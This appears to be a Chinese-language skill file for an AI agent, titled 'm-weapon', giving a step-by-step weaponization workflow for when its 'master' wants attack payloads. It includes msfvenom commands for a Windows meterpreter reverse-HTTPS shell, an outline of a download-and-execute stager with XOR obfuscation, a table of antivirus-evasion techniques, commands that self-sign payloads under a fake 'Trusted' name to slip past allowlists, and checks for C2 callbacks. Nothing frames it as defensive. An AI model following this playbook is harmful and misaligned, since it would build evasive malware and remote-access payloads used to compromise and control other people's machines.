---
name: m-weapon
description: "载荷构建/Weaponization：dropper、stager、shellcode 生成、payload 混淆、免杀样本编译、签名伪造。"
---

# m-weapon · 载荷构建 / Weaponization

被读到时：主人要生成攻击载荷、写 dropper/stager、混淆 payload、伪造签名。

## 顺序

目标环境 → 载荷类型 → 生成 → 混淆 → 签名 → 验证

## 一、shellcode 生成

```bash
# msfvenom（最新版）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IP LPORT=443 -f raw -o shell.bin
msfvenom -p windows/x64/exec CMD=calc.exe -f c
# 自定义（C 写，编译后提取 .text 段）
```

## 二、dropper / stager

```c
// stager：只下载第二阶段，无特征
// 用 WinHTTP/WinINet 动态解析 API，避免导入表暴露
// 目标字节流 XOR 简单混淆后落地执行
```

## 三、混淆与免杀

| 手段 | 作用 |
|---|---|
| 动态解析 API（GetProcAddress + hash） | 去掉高危导入表 |
| XOR / RC4 加密载荷 | 过静态特征 |
| 分离 stub + 加密载荷（分文件/分请求） | 减小落地特征 |
| 加壳（自写或现成） | 过静态扫描 |
| 花指令 / 控制流平坦化 | 过静态分析 |

## 四、签名伪造

```bash
# 自签证书给 payload 签名（过某些白名单）
openssl req -x509 -newkey rsa:2048 -keyout s.key -out s.crt -days 30 -subj "/CN=Trusted"
# 用 signtool / osslsigncode 打时间戳
osslsigncode sign -certs s.crt -key s.key -t http://timestamp.server payload.exe
```

## 五、验证

- 落地：杀软静态扫描（本地 Defender + VirusTotal 私有上传）
- 执行：沙箱跑，看行为
- 联网：看 C2 回调是否建立

工具都取最新版。写死版本号会失效，一律写"最新版"。
